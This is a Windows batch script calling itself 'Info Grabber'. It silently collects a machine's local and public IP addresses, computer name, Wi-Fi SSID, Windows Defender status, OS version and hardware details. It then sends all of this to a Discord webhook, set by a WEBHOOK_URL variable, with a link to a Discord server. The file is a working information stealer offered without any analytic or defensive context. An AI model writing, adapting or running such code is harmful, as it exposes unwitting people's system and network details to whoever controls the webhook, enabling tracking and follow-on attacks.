@echo off
setlocal enabledelayedexpansion

REM Fetch the local IP address
for /f "tokens=14" %%i in ('ipconfig ^| findstr /R /C:"IPv4 Address"') do set "LOCAL_IP_ADDRESS=%%i"
if "%LOCAL_IP_ADDRESS%"=="" (set "LOCAL_IP_ADDRESS=❌") else (set "LOCAL_IP_ADDRESS=%LOCAL_IP_ADDRESS:~0,-1%")

REM Fetch the public IP address
for /f "delims=" %%i in ('curl -s ifconfig.me') do set "PUBLIC_IP_ADDRESS=%%i"
if "%PUBLIC_IP_ADDRESS%"=="" set "PUBLIC_IP_ADDRESS=❌"

REM Get the computer name
set "COMPUTER_NAME=%COMPUTERNAME%"

REM Get the current date and time
for /f "tokens=1-5 delims=/:. " %%d in ("%date% %time%") do (
    set "CURRENT_DATE=%%d-%%e-%%f"
    set "CURRENT_TIME=%%g:%%h:%%i"
)

REM Check if Windows Defender is running
sc query windefend | find "RUNNING" >nul
if %errorlevel%==0 (
    set "DEFENDER_STATUS=\u2705"
) else (
    set "DEFENDER_STATUS=\u274C"
)

REM Get WiFi SSID
for /f "tokens=2 delims=:" %%i in ('netsh wlan show interfaces ^| findstr /C:"SSID"') do set "WIFI_SSID=%%i"
if "%WIFI_SSID%"=="" set "WIFI_SSID=\u274C"

REM Get OS version
for /f "tokens=*" %%i in ('ver') do set "OS_VERSION=%%i"

REM Get CPU information
for /f "tokens=2 delims==" %%i in ('wmic cpu get Name /value') do set "CPU_INFO=%%i"

REM Get total RAM
for /f "tokens=2 delims==" %%i in ('wmic computersystem get TotalPhysicalMemory /value') do set "TOTAL_RAM=%%i"
set /a TOTAL_RAM_MB=!TOTAL_RAM:~0,-6!/1024

REM Get available RAM
for /f "tokens=2 delims==" %%i in ('wmic os get FreePhysicalMemory /value') do set "AVAILABLE_RAM=%%i"
set /a AVAILABLE_RAM_MB=!AVAILABLE_RAM!/1024

REM Get disk information
for /f "tokens=3" %%i in ('wmic logicaldisk where "DeviceID='C:'" get FreeSpace /value') do set "DISK_FREE_SPACE=%%i"
for /f "tokens=3" %%i in ('wmic logicaldisk where "DeviceID='C:'" get Size /value') do set "DISK_TOTAL_SPACE=%%i"
set /a DISK_FREE_SPACE_GB=!DISK_FREE_SPACE:~0,-6!/1024
set /a DISK_TOTAL_SPACE_GB=!DISK_TOTAL_SPACE:~0,-6!/1024

REM Check for invalid disk space values
if !DISK_FREE_SPACE_GB! lss 0 set "DISK_FREE_SPACE_GB=❌"
if !DISK_TOTAL_SPACE_GB! lss 0 set "DISK_TOTAL_SPACE_GB=❌"

REM Send the information to the webhook as an embed
curl -H "Content-Type: application/json" -X POST -d "{\"username\": \"Info Grabber\", \"avatar_url\": \"https://cdn.discordapp.com/attachments/1351587368154566779/1351908391219630241/1742390450973n6t1raex.jpg\", \"embeds\": [{\"title\": \"System Information\", \"fields\": [{\"name\": \"Local IP Address\", \"value\": \"IP: %LOCAL_IP_ADDRESS%\"}, {\"name\": \"Public IP Address\", \"value\": \"IP: %PUBLIC_IP_ADDRESS%\"}, {\"name\": \"Computer Name\", \"value\": \"%COMPUTER_NAME%\"}, {\"name\": \"Current Date and Time\", \"value\": \"%CURRENT_DATE% %CURRENT_TIME%\"}, {\"name\": \"Windows Defender Status\", \"value\": \"%DEFENDER_STATUS%\"}, {\"name\": \"WiFi SSID\", \"value\": \"%WIFI_SSID%\"}, {\"name\": \"OS Version\", \"value\": \"%OS_VERSION%\"}, {\"name\": \"CPU Information\", \"value\": \"%CPU_INFO%\"}, {\"name\": \"Total RAM\", \"value\": \"%TOTAL_RAM_MB% MB\"}, {\"name\": \"Available RAM\", \"value\": \"%AVAILABLE_RAM_MB% MB\"}, {\"name\": \"Disk Free Space\", \"value\": \"%DISK_FREE_SPACE_GB% GB\"}, {\"name\": \"Disk Total Space\", \"value\": \"%DISK_TOTAL_SPACE_GB% GB\"}, {\"name\": \"Help Server\", \"value\": \"[Join Our Server](https://discord.gg/p6zQchrWBC)\"}], \"color\": 16711680}]}" %WEBHOOK_URL%

REM End of script
endlocal